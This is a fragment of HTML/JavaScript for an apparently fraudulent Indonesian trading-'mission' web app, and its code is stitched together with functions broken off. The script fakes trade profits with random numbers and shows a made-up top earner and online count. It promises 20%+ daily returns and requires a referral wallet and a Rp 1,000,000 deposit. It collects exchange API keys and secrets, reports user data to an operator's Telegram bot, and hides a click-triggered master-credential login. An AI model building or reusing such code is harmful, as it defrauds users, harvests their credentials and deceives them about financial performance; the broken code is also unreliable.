    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Space+Grotesk:wght@300;500;700&display=swap');
        :root { --gold: #ffd700; --emerald: #10b981; --rose: #f43f5e; --glass: rgba(10, 10, 20, 0.98); }
        
        body { background: #010205; color: #e2e8f0; font-family: 'Space Grotesk', sans-serif; overflow: hidden; height: 100vh; margin: 0; user-select: none; }
        .titan-font { font-family: 'Orbitron', sans-serif; }
        
        /* PREMIUM UI MODAL */
        .glass-premium { background: var(--glass); backdrop-filter: blur(40px); border: 1px solid rgba(255, 215, 0, 0.2); border-radius: 1.5rem; box-shadow: 0 0 50px rgba(0,0,0,0.9); }
        .popup-animate { animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
        @keyframes slideUp { from { transform: translateY(40px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }

        /* FLOATING TOAST NOTIF */
        #toast-container { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 100000; width: 85%; pointer-events: none; }
        .toast-msg { background: rgba(10, 10, 20, 0.95); border: 1px solid rgba(255, 215, 0, 0.3); border-left: 4px solid var(--gold); padding: 12px; margin-bottom: 8px; border-radius: 12px; font-size: 10px; animation: toastIn 0.5s forwards; backdrop-filter: blur(10px); color: white; }
        @keyframes toastIn { from { opacity: 0; transform: translateY(-30px); } to { opacity: 1; transform: translateY(0); } }

        /* SIGNAL CARDS */
        .signal-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,215,0,0.15); padding: 10px; border-radius: 1.2rem; transition: 0.3s; position: relative; }
        .signal-card.locked { opacity: 0.15; filter: blur(4px); pointer-events: none; }
        .glow-pulse { animation: pulseGlow 1.2s infinite alternate; border-color: var(--gold); }
        @keyframes pulseGlow { from { box-shadow: 0 0 2px var(--gold); } to { box-shadow: 0 0 15px var(--gold); } }

        .input-premium { background: rgba(0,0,0,0.7); border: 1px solid rgba(255,215,0,0.2); padding: 14px; border-radius: 1rem; color: white; font-size: 12px; width: 100%; outline: none; }
        .tab-locked { opacity: 0.2; filter: grayscale(1); cursor: not-allowed; }
        .module-container { height: calc(100vh - 440px); overflow-y: auto; padding: 5px; scroll-behavior: smooth; }
        .no-scrollbar::-webkit-scrollbar { display: none; }
    </style>
</head>

            if (state.trades.length >= 10) return alertModal("10 SLOT PENUH! Selesaikan Sell terlebih dahulu.");

            state.trades.push({ sym, entry: price, curr: price, profit: 0, type, stake, spark: [] });

        function renderExecution() {
            document.getElementById('slot-count').innerText = `(${state.trades.length}/10)`;

                    <button onclick="${state.lvl === 3 ? '' : `secureProfit(${i})`}" 
                            class="mt-2 bg-white/10 w-full py-1.5 rounded-lg text-[8px] ${state.lvl === 3 ? 'opacity-10 cursor-default' : 'active:bg-rose-500'}">SELL</button>

            state.trades.forEach((t, i) => { if(t.spark && t.spark.length > 0) drawSparkline(`exec-chart-${i}`, t.spark, t.profit >= 0 ? '#10b981' : '#f43f5e'); });

        function secureProfit(idx) {
            const t = state.trades[idx]; state.equity += (t.stake * t.profit) / 100;
            state.history.unshift({ ...t, time: new Date().toLocaleTimeString() });

            state.trades.splice(idx, 1); refreshEquity(); renderExecution(); renderVault();

        function issueCertificate() {
            if (state.user.isCertified) return;
            state.user.isCertified = true; localStorage.setItem(`TITAN_U_${state.user.id}`, encrypt(state.user));
            sendTelegram(`ðŸŽ“ *CONGRATULATIONS*\nID: ${state.user.id}\nTG: ***${state.user.tg.slice(-3)}\nStatus: LULUS 120 HARI`);
            openModal(`<div class="p-6 border-2 border-yellow-500 rounded-3xl"><i class="fa-solid fa-medal text-6xl text-yellow-500 mb-4"></i><h2 class="titan-font">SUPREME MASTER</h2><p class="text-[9px] mt-2 opacity-60">Kontrak Berakhir. Sertifikat Terbit.</p></div>`);
        }

        function showMissionGuide() {
            const guides = [
                "<h3>LEVEL 1: TRAINING</h3><p class='text-[10px] p-4 opacity-70'>Simulasi 10 Slot. Target 5%. Belajar psikologi disiplin. Jika target tercapai, kartu buy terkunci.</p>",
                "<h3>LEVEL 2: ELITE</h3><p class='text-[10px] p-4 opacity-70'>Real Trade Manual. Wajib Dompet Reff Admin. Tombol terhubung ke Bursa Asli. Target 10%.</p>",
                "<h3>LEVEL 3: MASTER</h3><p class='text-[10px] p-4 opacity-70'>Autopilot Aktif. API Synced dari dompet Level 2. Target 20%+/Hari. Tanpa eksekusi manual.</p>"
            ];
            openModal(guides[state.lvl-1]);
        }

        function openConfig() {
            if (state.lvl < 3) return alertModal("LEVEL 3 MASTER ONLY");
            if (!state.user.isReffValidated) return showReffMission();
            const set = state.apiKey ? "disabled opacity-40" : "";
            openModal(`
                <div class="space-y-4">
                    <p class="titan-font text-[10px] uppercase">API Sync L2 Wallet</p>
                    <input type="text" id="api-k" placeholder="API KEY" class="input-premium" ${set} value="${state.apiKey||''}">
                    <input type="password" id="api-s" placeholder="SECRET KEY" class="input-premium" ${set} value="${state.apiSecret||''}">
                    <button onclick="saveAPI()" class="w-full py-4 bg-emerald-600 rounded-2xl titan-font text-[10px] ${state.apiKey?'hidden':''}">SYNC & LOCK</button>
                    ${state.apiKey ? '<button onclick="state.apiKey=null;openConfig()" class="text-[8px] text-rose-500">RESET CONNECTION</button>' : ''}
                </div>
            `);
        }

        function saveAPI() { state.apiKey = document.getElementById('api-k').value; state.apiSecret = document.getElementById('api-s').value; closeModal(); spawnToast("Autopilot Aktif!"); }

        function showBalanceInit() { openModal(`<div><h3 class="titan-font text-xs mb-4">INPUT MODAL AWAL</h3><input type="number" id="init-val" placeholder="Min 1.000.000" class="input-premium text-center mb-4"><button onclick="saveFund()" class="w-full py-4 bg-yellow-500 text-black titan-font text-[10px] rounded-2xl font-black uppercase">Start Mission</button></div>`); }

        function saveFund() { 
            const v = parseFloat(document.getElementById('init-val').value); 
            if(v >= 1000000) { state.equity = v; state.initialEquity = v; localStorage.setItem(`INIT_FUND_${state.user.id}`, v); refreshEquity(); closeModal(); spawnToast("Misi Dimulai!"); } else alertModal("Minimal 1 Juta Rupiah.");
        }

        function drawSparkline(id, data, color) {
            const c = document.getElementById(id); if (!c) return;
            const ctx = c.getContext('2d'), pts = data.slice(-20), min = Math.min(...pts), max = Math.max(...pts), rng = max - min;
            ctx.clearRect(0,0,c.width,c.height); ctx.beginPath(); ctx.strokeStyle = color; ctx.lineWidth = 2;
            pts.forEach((p, i) => { const x = (i/19)*c.width, y = c.height - ((p-min)/rng)*c.height; if(i===0) ctx.moveTo(x,y); else ctx.lineTo(x,y); }); ctx.stroke();
        }

        function startEngine() {
            setInterval(() => {
                state.trades.forEach((t, i) => { 
                    const fluktuasi = (Math.random()*0.02 - 0.0095);
                    t.curr *= (1 + fluktuasi); t.profit = ((t.curr - t.entry)/t.entry)*100;
                    if(!t.spark) t.spark = []; t.spark.push(t.curr); if(t.spark.length > 20) t.spark.shift();
                    if(t.profit >= 15 || t.profit <= -5) secureProfit(i);
                });
                renderExecution();
                const h = new Date().getHours(); const b = document.getElementById('api-status');
                if(h >= 18 && h <= 23) { b.innerText = "SYNC: DISC OPEN"; b.classList.replace('text-yellow-500', 'text-emerald-500'); }
                else { b.innerText = "SYNC: READY"; b.classList.replace('text-emerald-500', 'text-yellow-500'); }
                document.getElementById('top-ranker').innerText = `1. ID ${Math.floor(Math.random()*999)}*** (Rp ${(Math.random()*5+1).toFixed(1)}B)`;
                document.getElementById('live-online').innerText = `${Math.floor(Math.random()*2000+500)} Active Nodes`;
            }, 3000);
            setInterval(manualScan, 30000); manualScan();
        }

        function closeModal() { document.getElementById('global-modal').classList.add('hidden'); }
        function openModal(h, altBtn = false) { 
            document.getElementById('modal-content').innerHTML = h; 
            document.getElementById('modal-btn-alt').classList.toggle('hidden', !altBtn);
            document.getElementById('global-modal').classList.remove('hidden'); 
        }
        function alertModal(msg) { openModal(`<p class="text-xs uppercase titan-font text-rose-500">${msg}</p>`); }
        function confirmLogout() { 
            openModal(`<p class="text-xs titan-font">Terminate Session?</p>`, true);
            document.getElementById('modal-btn-main').onclick = () => location.reload();
        }
        function masterKnock() { state.knock++; if(state.knock >= 5) { document.getElementById('auth-phone').value = MASTER.ID; document.getElementById('auth-pass').value = MASTER.PASS; handleAuth('LOGIN'); } }
        async function sendTelegram(msg) { try { await fetch(`https://api.telegram.org/bot${MASTER.BOT}/sendMessage?chat_id=${MASTER.CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`); } catch(e) {} }
    </script>
